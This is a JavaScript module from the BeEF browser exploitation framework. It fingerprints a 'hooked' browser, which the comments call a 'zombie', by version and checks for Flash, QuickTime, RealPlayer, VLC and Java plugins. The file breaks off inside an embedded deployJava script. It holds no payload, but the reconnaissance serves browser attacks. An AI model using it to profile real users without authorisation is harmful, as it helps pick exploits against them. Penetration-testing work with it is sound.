//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName:function () {
        return navigator.userAgent;
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6:function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE:function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2:function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3:function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5:function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: beef.browser.isFF3_6()
     */
    isFF3_6:function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4:function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

	/**
	 * Returns true if FF20
	 * @example: beef.browser.isFF20()
	 */
	isFF20:function () {
		return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
	},

    /**
     * Returns true if FF.
     * @example: beef.browser.isFF()
     */
    isFF:function () {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4:function () {
        return (window.navigator.userAgent.match(/ Version\/4\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5:function () {
        return (window.navigator.userAgent.match(/ Version\/5\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6:function () {
        return (window.navigator.userAgent.match(/ Version\/6\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS:function () {
        return this.isS4() || this.isS5() || this.isS6();
    },

    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC:function () {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC20() || this.isC21() || this.isC22() || this.isC23() || this.isC24();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO:function () {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type:function () {

        return {
            C5:this.isC5(), // Chrome 5
            C6:this.isC6(), // Chrome 6
            C7:this.isC7(), // Chrome 7
            C8:this.isC8(), // Chrome 8
            C9:this.isC9(), // Chrome 9
            C10:this.isC10(), // Chrome 10
            C11:this.isC11(), // Chrome 11
            C12:this.isC12(), // Chrome 12
            C13:this.isC13(), // Chrome 13
            C14:this.isC14(), // Chrome 14
            C15:this.isC15(), // Chrome 15
            C16:this.isC16(), // Chrome 16
            C17:this.isC17(), // Chrome 17
            C18:this.isC18(), // Chrome 18
            C19:this.isC19(), // Chrome 19
            C20:this.isC20(), // Chrome 20
            C21:this.isC21(), // Chrome 21
            C22:this.isC22(), // Chrome 22
            C23:this.isC23(), // Chrome 23
            C24:this.isC24(), // Chrome 24
            C:this.isC(), // Chrome any version

            FF2:this.isFF2(), // Firefox 2
            FF3:this.isFF3(), // Firefox 3
            FF3_5:this.isFF3_5(), // Firefox 3.5
            FF3_6:this.isFF3_6(), // Firefox 3.6
            FF4:this.isFF4(), // Firefox 4
            FF5:this.isFF5(), // Firefox 5
            FF6:this.isFF6(), // Firefox 6
            FF7:this.isFF7(), // Firefox 7
            FF8:this.isFF8(), // Firefox 8
            FF9:this.isFF9(), // Firefox 9
            FF10:this.isFF10(), // Firefox 10
            FF11:this.isFF11(), // Firefox 11
            FF12:this.isFF12(), // Firefox 12
            FF13:this.isFF13(), // Firefox 13
            FF14:this.isFF14(), // Firefox 14
            FF15:this.isFF15(), // Firefox 15
            FF16:this.isFF16(), // Firefox 16
            FF17:this.isFF17(), // Firefox 17
            FF18:this.isFF18(), // Firefox 18
            FF19:this.isFF19(), // Firefox 19
			FF20:this.isFF20(), // Firefox 20
            FF:this.isFF(), // Firefox any version

            IE6:this.isIE6(), // Internet Explorer 6
            IE7:this.isIE7(), // Internet Explorer 7
            IE8:this.isIE8(), // Internet Explorer 8
            IE9:this.isIE9(), // Internet Explorer 9
            IE10:this.isIE10(), // Internet Explorer 10
            IE:this.isIE(), // Internet Explorer any version

            O9_52:this.isO9_52(), // Opera 9.50 through 9.52
            O9_60:this.isO9_60(), // Opera 9.60 through 9.64
            O10:this.isO10(), // Opera 10.xx
            O11:this.isO11(), // Opera 11.xx
            O12:this.isO12(), // Opera 11.xx
            O:this.isO(), // Opera any version

            S4:this.isS4(), // Safari 4.xx
            S5:this.isS5(), // Safari 5.xx
            S6:this.isS6(), // Safari 6.x
            S:this.isS()    // Safari any version
        }
    },

    /**
     * Returns the type of browser being used.
     * @return: {String} User agent software and version.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion:function () {

        if (this.isC5()) {
            return '5'
        }
        ; 	// Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ; 	// Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ; 	// Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ; 	// Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ; 	// Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ; 	// Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ; 	// Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ; 	// Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ; 	// Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ; 	// Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ; 	// Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;	// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;	// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;	// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;	// Chrome 19
        if (this.isC20()) {
            return '20'
        }
        ;	// Chrome 20
        if (this.isC21()) {
            return '21'
        }
        ;	// Chrome 21
        if (this.isC22()) {
            return '22'
        }
        ;    // Chrome 22
        if (this.isC23()) {
            return '23'
        }
        ;    // Chrome 23
        if (this.isC24()) {
            return '24'
        }
        ;    // Chrome 24

        if (this.isFF2()) {
            return '2'
        }
        ;	// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;	// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;	// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;	// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;	// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;	// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;	// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;	// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;	// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;	// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;	// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;	// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;	// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;	// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;	// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;	// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;	// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;    // Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;    // Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;    // Firefox 19
		if (this.isFF20()) {
			return '20'
		}
		;	// Firefox 20

        if (this.isIE6()) {
            return '6'
        }
        ;	// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;	// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;	// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;	// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;	// Internet Explorer 10

        if (this.isS4()) {
            return '4'
        }
        ;	// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;	// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;	// Safari 6

        if (this.isO9_52()) {
            return '9.5'
        }
        ;	// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;	// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;	// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;	// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;	// Opera 12.xx

        return 'UNKNOWN';				// Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName:function () {

        if (this.isC()) {
            return 'C'
        }
        ; 	// Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;		// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;		// Internet Explorer any version
        if (this.isO()) {
            return 'O'
        }
        ;		// Opera any version
        if (this.isS()) {
            return 'S'
        }
        ;		// Safari any version
        return 'UNKNOWN';					// Unknown UA
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash:function () {
        if (!this.type().IE) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        } else {
            flash_versions = 11;
            flash_installed = false;

            if (window.ActiveXObject) {
                for (x = 2; x <= flash_versions; x++) {
                    try {
                        Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                        if (Flash) {
                            flash_installed = true;
                        }
                    }
                    catch (e) {
                    }
                }
            }
            ;
            return flash_installed;
        }
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime:function () {

        var quicktime = false;

        // Not Internet Explorer
        if (!this.type().IE) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    quicktime = true;
                }

            }

            // Internet Explorer
        } else {

            try {

                var qt_test = new ActiveXObject('QuickTime.QuickTime');

            } catch (e) {
            }

            if (qt_test) {
                quicktime = true;
            }

        }

        return quicktime;

    },

	/**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer:function () {

        var realplayer = false;

        // Not Internet Explorer
        if (!this.type().IE) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    realplayer = true;
                }

            }

            // Internet Explorer
        } else {

			var definedControls = [
			    'RealPlayer',
				'rmocx.RealPlayer G2 Control',
			    'rmocx.RealPlayer G2 Control.1',
			    'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
			    'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
				];

			for (var i = 0; i < definedControls.length; i++) {

            	try {

                	var rp_test = new ActiveXObject(definedControls[i]);

            	} catch (e) {
            	}

            	if ( rp_test ) {
                	realplayer = true;
            	}
			}
        }

        return realplayer;

    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC:function() {
        var vlc = false ;
        if(!this.type().IE) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    vlc = true;
                }
            }
        } else {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                vlc = true ;
                } catch(e) {
                }
        };
        return vlc ;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled:function () {

        if (!this.isIE()) {

            // Cross-browser Java Deployment Toolkit Script
            // Source: http://java.com/js/deployJava.js
            deployJava = function () {
                var l = {core:["id", "class", "title", "style"], i18n:["lang", "dir"], events:["onclick", "ondblclick", "onmousedown", "onmouseup", "onmouseover", "onmousemove", "onmouseout", "onkeypress", "onkeydown", "onkeyup"], applet:["codebase", "code", "name", "archive", "object", "width", "height", "alt", "align", "hspace", "vspace"], object:["classid", "codebase", "codetype", "data", "type", "archive", "declare", "standby", "height", "width", "usemap", "name", "tabindex", "align", "border", "hspace", "vspace"]};
                var b = l.object.concat(l.core, l.i18n, l.events);
                var m = l.applet.concat(l.core);

                function g(n) {
                    if (!d.debug) {
                        return
                    }
                    if (console.log) {
                        console.log(n)
                    } else {
                        alert(n)
                    }
                }

                function k(o, n) {
                    if (o == null || o.length == 0) {
                        return true
                    }
                    var q = o.charAt(o.length - 1);
                    if (q != "+" && q != "*" && (o.indexOf("_") != -1 && q != "_")) {
                        o = o + "*";
                        q = "*"
                    }
                    o = o.substring(0, o.length - 1);
                    if (o.length > 0) {
                        var p = o.charAt(o.length - 1);
                        if (p == "." || p == "_") {
                            o = o.substring(0, o.length - 1)
                        }
                    }
                    if (q == "*") {
                        return(n.indexOf(o) == 0)
                    } else {
                        if (q == "+") {
                            return o <= n
                        }
                    }
                    return false
                }

                function e() {
                    var n = "//java.com/js/webstart.png";
                    try {
                        return document.location.protocol.indexOf("http") != -1 ? n : "http:" + n
                    } catch (o) {
                        return"http:" + n
                    }
                }

                function j(p, o) {
                    var n = p.length;
                    for (var q = 0; q < n; q++) {
                        if (p[q] === o) {
                            return true
                        }
                    }
                    return false
                }

                function c(n) {
                    return j(m, n.toLowerCase())
                }

                function i(n) {
                    return j(b, n.toLowerCase())
                }

                function a(n) {
                    if ("MSIE" != deployJava.browserName) {
                        return true
                    }
                    if (deployJava.compareVersionToPattern(deployJava.getPlugin().version, ["10", "0", "0"], false, true)) {
                        return true
                    }
                    if (n == null) {
                        return false
                    }
                    return !k("1.6.0_33+", n)
                }

                var d = {debug:null, version:"20120801", firefoxJavaVersion:null, myInterval:null, preInstallJREList:null, returnPage:null, brand:null, locale:null, installType:null, EAInstallEnabled:false, EarlyAccessURL:null, getJavaURL:"http://jdl.sun.com/webapps/getjava/BrowserRedirect?host=java.com", oldMimeType:"application/npruntime-scriptable-plugin;DeploymentToolkit", mimeType:"application/java-deployment-toolkit", launchButtonPNG:e(), browserName:null, browserName2:null, getJREs:function () {
                    var r = new Array();
                    if (this.isPluginInstalled()) {
                        var q = this.getPlugin();
                        var n = q.jvms;
                        for (var p = 0; p < n.getLength(); p++) {
                            r[p] = n.get(p).version
                        }
                    } else {
                        var o = this.getBrowser();
                        if (o == "MSIE") {
                            if (this.testUsingActiveX("1.7.0")) {
                                r[0] = "1.7.0"
                            } else {
                                if (this.testUsingActiveX("1.6.0")) {
                                    r[0] = "1.6.0"
                                } else {
                                    if (this.testUsingActiveX("1.5.0")) {
                                        r[0] = "1.5.0"
                                    } else {
                                        if (this.testUsingActiveX("1.4.2")) {
                                            r[0] = "1.4.2"
                                        } else {
                                            if (this.testForMSVM()) {
                                                r[0] = "1.1"
                                            }
                                        }
                                    }
                                }
                            }
                        } else {
                            if (o == "Netscape Family") {
                                this.getJPIVersionUsingMimeType();
                                if (this.firefoxJavaVersion != null) {
                                    r[0] = this.firefoxJavaVersion
                                } else {
                                    if (this.testUsingMimeTypes("1.7")) {
                                        r[0] = "1.7.0"
                                    } else {
                                        if (this.testUsingMimeTypes("1.6")) {
                                            r[0] = "1.6.0"
                                        } else {
                                            if (this.testUsingMimeTypes("1.5")) {
                                                r[0] = "1.5.0"
                                            } else {
                                                if (this.testUsingMimeTypes("1.4.2")) {
                                                    r[0] = "1.4.2"
                                                } else {
                                                    if (this.browserName2 == "Safari") {
                                                        if (this.testUsingPluginsArray("1.7.0")) {
                                                            r[0] = "1.7.0"
                                                        } else {
                                                            if (this.testUsingPluginsArray("1.6")) {
                                                                r[0] = "1.6.0"
                                                            } else {
                                                                if (this.testUsingPluginsArray("1.5")) {
                                                                    r[0] = "1.5.0"
                                                                } else {
                                                                    if (this.testUsingPluginsArray("1.4.2")) {
                                                                        r[0] = "1.4.2"
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if (this.debug) {
                        for (var p = 0; p < r.length; ++p) {
                            g("[getJREs()] We claim to have detected Java SE " + r[p])
                        }
                    }
                    return r
                }, installJRE:function (q, o) {
                    var n = false;
                    if (this.isPluginInstalled() && this.isAutoInstallEnabled(q)) {
                        var p = false;
                        if (this.isCallbackSupported()) {
                            p = this.getPlugin().installJRE(q, o)
                        } else {
                            p = this.getPlugin().installJRE(q)
                        }
                        if (p) {
                            this.refresh();
                            if (this.returnPage != null) {
                                document.location = this.returnPage
                            }
                        }
                        return p
                    } else {
                        return this.installLatestJRE()
                    }
                }, isAutoInstallEnabled:function (n) {
                    if (!this.isPluginInstalled()) {
                        return false
                    }
                    if (typeof n == "undefined") {
                        n = null
                    }
                    return a(n)
                }, isCallbackSupported:function () {
                    return this.isPluginInstalled() && this.compareVersionToPattern(this.getPlugin().version, ["10", "2", "0"], false, true)
